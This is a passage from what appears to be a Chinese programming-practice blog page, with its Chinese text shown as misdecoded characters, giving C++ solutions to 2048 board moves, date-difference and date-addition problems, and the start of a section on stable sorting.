class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> data[<span class="number">4</span>][<span class="number">4</span>];</span><br><span class="line"><span class="keyword">int</span> s[<span class="number">4</span>][<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; n)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)&#123;</span><br><span class="line">cin &gt;&gt; s[i][j]; </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(n == <span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)&#123;</span><br><span class="line"><span class="keyword">int</span> tmp[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;, idx = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(s[j][i] != <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(j != <span class="number">3</span>)&#123;</span><br><span class="line"><span class="keyword">int</span> jud = <span class="number">1</span>; </span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> k = j+<span class="number">1</span>; k &lt; <span class="number">4</span>; k++)&#123;</span><br><span class="line"><span class="keyword">if</span>(s[k][i] == <span class="number">0</span>) <span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">if</span>(s[k][i] == s[j][i])&#123;</span><br><span class="line">tmp[idx++] = <span class="number">2</span> * s[j][i];</span><br><span class="line">j = k;</span><br><span class="line">jud = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">tmp[idx++] = s[j][i];</span><br><span class="line">jud = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(jud)&#123;</span><br><span class="line">tmp[idx++] = s[j][i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">tmp[idx++] = s[j][i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)&#123;</span><br><span class="line">s[j][i] = tmp[j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(n == <span class="number">2</span>)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)&#123;</span><br><span class="line"><span class="keyword">int</span> tmp[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;, idx = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">3</span>; j &gt;= <span class="number">0</span>; j--)&#123;</span><br><span class="line"><span class="keyword">if</span>(s[j][i] != <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(j != <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">int</span> jud = <span class="number">1</span>; </span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> k = j - <span class="number">1</span>; k &gt;= <span class="number">0</span>; k--)&#123;</span><br><span class="line"><span class="keyword">if</span>(s[k][i] == <span class="number">0</span>) <span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">if</span>(s[k][i] == s[j][i])&#123;</span><br><span class="line">tmp[idx++] = <span class="number">2</span> * s[j][i];</span><br><span class="line">j = k;</span><br><span class="line">jud = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">tmp[idx++] = s[j][i];</span><br><span class="line">jud = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(jud)&#123;</span><br><span class="line">tmp[idx++] = s[j][i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">tmp[idx++] = s[j][i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">3</span>; j &gt;= <span class="number">0</span>; j--)&#123;</span><br><span class="line">s[j][i] = tmp[<span class="number">3</span>-j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(n == <span class="number">3</span>)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)&#123;</span><br><span class="line"><span class="keyword">int</span> tmp[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;, idx = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(s[i][j] != <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(j!=<span class="number">3</span>)&#123;</span><br><span class="line"><span class="keyword">int</span> jud = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> k = j + <span class="number">1</span>; k &lt; <span class="number">4</span>; k++)&#123;</span><br><span class="line"><span class="keyword">if</span>(s[i][k] == <span class="number">0</span>) <span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">if</span>(s[i][j] == s[i][k])&#123;</span><br><span class="line">tmp[idx++] = <span class="number">2</span> * s[i][j];</span><br><span class="line">j = k;</span><br><span class="line">jud = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">tmp[idx++] = s[i][j];</span><br><span class="line">jud = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(jud)&#123;</span><br><span class="line">tmp[idx++] = s[i][j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">tmp[idx++] = s[i][j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)&#123;</span><br><span class="line">s[i][j] = tmp[j];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(n == <span class="number">4</span>)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)&#123;</span><br><span class="line"><span class="keyword">int</span> tmp[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;, idx = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">3</span>; j &gt;= <span class="number">0</span>; j--)&#123;</span><br><span class="line"><span class="keyword">if</span>(s[i][j] != <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(j != <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">int</span> jud = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> k = j - <span class="number">1</span>; k &gt;= <span class="number">0</span>; k--)&#123;</span><br><span class="line"><span class="keyword">if</span>(s[i][k] == <span class="number">0</span>) <span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">if</span>(s[i][j] == s[i][k])&#123;</span><br><span class="line">tmp[idx++] = <span class="number">2</span> * s[i][j];</span><br><span class="line">j = k;</span><br><span class="line">jud = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">tmp[idx++] = s[i][j];</span><br><span class="line">jud = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(jud)&#123;</span><br><span class="line">tmp[idx++] = s[i][j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">tmp[idx++] = s[i][j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">3</span>; j &gt;= <span class="number">0</span>; j--)&#123;</span><br><span class="line">s[i][j] = tmp[<span class="number">3</span>-j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)&#123;</span><br><span class="line">cout &lt;&lt; s[i][j] &lt;&lt; <span class="string">&quot; &quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="æ—¥æœŸ"><a href="#æ—¥æœŸ" class="headerlink" title="æ—¥æœŸ"></a>æ—¥æœŸ</h2><h3 id="æ—¥æœŸå·®å€¼"><a href="#æ—¥æœŸå·®å€¼" class="headerlink" title="æ—¥æœŸå·®å€¼"></a>æ—¥æœŸå·®å€¼</h3><p>åŒä¸€å¹´ç”¨ä¸€ä¸ªå‡½æ•°æ¥å†™ï¼›</p><p>ä¸åŒå¹´çš„æ‹†æˆä¸‰éƒ¨åˆ†ï¼Œç¬¬ä¸€å¹´æ•°æ®åˆ°å¹´åº•ã€ä¸­é—´ã€ç¬¬äºŒå¹´å¹´åˆåˆ°æ•°æ®</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">data</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> year, month, day;</span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">is_lunar</span><span class="params">(<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(y%<span class="number">400</span>==<span class="number">0</span> || (y%<span class="number">4</span>==<span class="number">0</span> &amp;&amp; y%<span class="number">100</span>!=<span class="number">0</span>)) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cal_days</span><span class="params">(struct data d1, struct data d2)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> f[<span class="number">13</span>] = &#123;<span class="number">0</span>, <span class="number">31</span>, <span class="number">28</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(d1.month == d2.month) ans = d2.day - d1.day + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">is_lunar</span>(d1.year))&#123;</span><br><span class="line">f[<span class="number">2</span>] = <span class="number">29</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">f[<span class="number">2</span>] = <span class="number">28</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f[d1.month] -= d1.day;</span><br><span class="line">ans = d2.day + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = d1.month; i &lt; d2.month; i++)&#123;</span><br><span class="line">ans += f[i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> r1[<span class="number">10</span>], r2[<span class="number">10</span>];</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; r1 &gt;&gt; r2)&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">data</span> <span class="title">d1</span>, <span class="title">d2</span>;</span></span><br><span class="line">d1.year = (r1[<span class="number">0</span>]-<span class="string">&#x27;0&#x27;</span>) * <span class="number">1000</span> + (r1[<span class="number">1</span>]-<span class="string">&#x27;0&#x27;</span>) * <span class="number">100</span> + (r1[<span class="number">2</span>]-<span class="string">&#x27;0&#x27;</span>) * <span class="number">10</span> + (r1[<span class="number">3</span>]-<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">d1.month = (r1[<span class="number">4</span>]-<span class="string">&#x27;0&#x27;</span>) * <span class="number">10</span> + (r1[<span class="number">5</span>]-<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">d1.day = (r1[<span class="number">6</span>]-<span class="string">&#x27;0&#x27;</span>) * <span class="number">10</span> + (r1[<span class="number">7</span>]-<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">d2.year = (r2[<span class="number">0</span>]-<span class="string">&#x27;0&#x27;</span>) * <span class="number">1000</span> + (r2[<span class="number">1</span>]-<span class="string">&#x27;0&#x27;</span>) * <span class="number">100</span> + (r2[<span class="number">2</span>]-<span class="string">&#x27;0&#x27;</span>) * <span class="number">10</span> + (r2[<span class="number">3</span>]-<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">d2.month = (r2[<span class="number">4</span>]-<span class="string">&#x27;0&#x27;</span>) * <span class="number">10</span> + (r2[<span class="number">5</span>]-<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">d2.day = (r2[<span class="number">6</span>]-<span class="string">&#x27;0&#x27;</span>) * <span class="number">10</span> + (r2[<span class="number">7</span>]-<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//cout &lt;&lt; &quot;-----------&quot; &lt;&lt; endl;</span></span><br><span class="line"><span class="comment">//cout &lt;&lt; d1.year &lt;&lt; &quot;-&quot; &lt;&lt; d1.month &lt;&lt; &quot;-&quot; &lt;&lt; d1.day &lt;&lt; endl;</span></span><br><span class="line"><span class="comment">//cout &lt;&lt; d2.year &lt;&lt; &quot;-&quot; &lt;&lt; d2.month &lt;&lt; &quot;-&quot; &lt;&lt; d2.day &lt;&lt; endl;</span></span><br><span class="line"><span class="comment">//cout &lt;&lt; &quot;-----------&quot; &lt;&lt; endl;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(d1.year == d2.year)&#123;</span><br><span class="line">ans = <span class="built_in">cal_days</span>(d1, d2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">struct data d3 = &#123;</span><br><span class="line">d1.year,</span><br><span class="line"><span class="number">12</span>,</span><br><span class="line"><span class="number">31</span></span><br><span class="line">&#125;;</span><br><span class="line">ans += <span class="built_in">cal_days</span>(d1, d3);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = d1.year+<span class="number">1</span>; i &lt; d2.year; i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">is_lunar</span>(i)) ans += <span class="number">366</span>;</span><br><span class="line"><span class="keyword">else</span> ans += <span class="number">365</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">data</span> <span class="title">d4</span> =</span> &#123;</span><br><span class="line">d2.year,</span><br><span class="line"><span class="number">1</span>,</span><br><span class="line"><span class="number">1</span></span><br><span class="line">&#125;;</span><br><span class="line">ans += <span class="built_in">cal_days</span>(d4, d2);</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; ans &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="æ‰“å°æ—¥æœŸ"><a href="#æ‰“å°æ—¥æœŸ" class="headerlink" title="æ‰“å°æ—¥æœŸ"></a>æ‰“å°æ—¥æœŸ</h3><p>æ ¼å¼åŒ–è¾“å‡ºå•¥çš„</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">is_lunar</span><span class="params">(<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(y%<span class="number">400</span>==<span class="number">0</span> || (y%<span class="number">4</span>==<span class="number">0</span> &amp;&amp; y%<span class="number">100</span>!=<span class="number">0</span>)) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> y, d;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; y &gt;&gt; d)&#123;</span><br><span class="line"><span class="keyword">int</span> f[<span class="number">13</span>] = &#123;<span class="number">0</span>, <span class="number">31</span>, <span class="number">28</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>&#125;;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">is_lunar</span>(y)) f[<span class="number">2</span>] = <span class="number">29</span>;</span><br><span class="line"><span class="keyword">else</span> f[<span class="number">2</span>] = <span class="number">28</span>;</span><br><span class="line"><span class="keyword">int</span> ans = <span class="number">1</span>, i = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span>(d &gt; f[i])&#123;</span><br><span class="line">d -= f[i];</span><br><span class="line">i++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d-%02d-%02d\n&quot;</span>, y, i, d);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="æ—¥æœŸç´¯åŠ "><a href="#æ—¥æœŸç´¯åŠ " class="headerlink" title="æ—¥æœŸç´¯åŠ "></a>æ—¥æœŸç´¯åŠ </h3><p>è®¾è®¡ä¸€ä¸ªç¨‹åºèƒ½è®¡ç®—ä¸€ä¸ªæ—¥æœŸåŠ ä¸Šè‹¥å¹²å¤©åæ˜¯ä»€ä¹ˆæ—¥æœŸã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">is_lunar</span><span class="params">(<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(y%<span class="number">400</span>==<span class="number">0</span> || (y%<span class="number">4</span>==<span class="number">0</span> &amp;&amp; y%<span class="number">100</span>!=<span class="number">0</span>)) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> m;</span><br><span class="line">cin &gt;&gt; m;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; i++)&#123;</span><br><span class="line"><span class="keyword">int</span> y, m, d, n;</span><br><span class="line">cin &gt;&gt; y &gt;&gt; m &gt;&gt; d &gt;&gt; n;</span><br><span class="line">d += n;</span><br><span class="line"><span class="keyword">int</span> f[<span class="number">13</span>] = &#123;<span class="number">0</span>, <span class="number">31</span>, <span class="number">28</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>&#125;;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">is_lunar</span>(y)) f[<span class="number">2</span>] = <span class="number">29</span>;</span><br><span class="line"><span class="keyword">else</span> f[<span class="number">2</span>] = <span class="number">28</span>;</span><br><span class="line"><span class="keyword">int</span> y_ = y;</span><br><span class="line"><span class="keyword">while</span>(d &gt; f[m])&#123;</span><br><span class="line">d -= f[m];</span><br><span class="line">m ++;</span><br><span class="line"><span class="keyword">if</span>(m &gt; <span class="number">12</span>)&#123;</span><br><span class="line">m -= <span class="number">12</span>;</span><br><span class="line">y ++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(y_ != y)&#123;</span><br><span class="line">y_ = y;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">is_lunar</span>(y)) f[<span class="number">2</span>] = <span class="number">29</span>;</span><br><span class="line"><span class="keyword">else</span> f[<span class="number">2</span>] = <span class="number">28</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d-%02d-%02d\n&quot;</span>, y, m, d);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="æ’åº-1"><a href="#æ’åº-1" class="headerlink" title="æ’åº"></a>æ’åº</h2><p>sortå’Œstable_sort</p><p><img src="../images/%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230613121222002.png" alt="image-20230613121222002"></p><h3 id="æˆç»©æ’åº"><a href="#æˆç»©æ’åº" class="headerlink" title="æˆç»©æ’åº"></a>æˆç»©æ’åº</h3><p>é¢˜ç›®ï¼šè¾“å…¥ä»»æ„ï¼ˆç”¨æˆ·ï¼Œæˆç»©ï¼‰åºåˆ—ï¼Œå¯ä»¥è·å¾—æˆç»©ä»é«˜åˆ°ä½æˆ–ä»ä½åˆ°é«˜çš„æ’åˆ—,ç›¸åŒæˆç»©éƒ½æŒ‰å…ˆå½•å…¥æ’åˆ—åœ¨å‰çš„è§„åˆ™å¤„ç†ã€‚</p><p>ä¸¤ç§åŠæ³•ï¼š</p><ol><li><p>ç”¨stable_sort</p><figure class="highlight 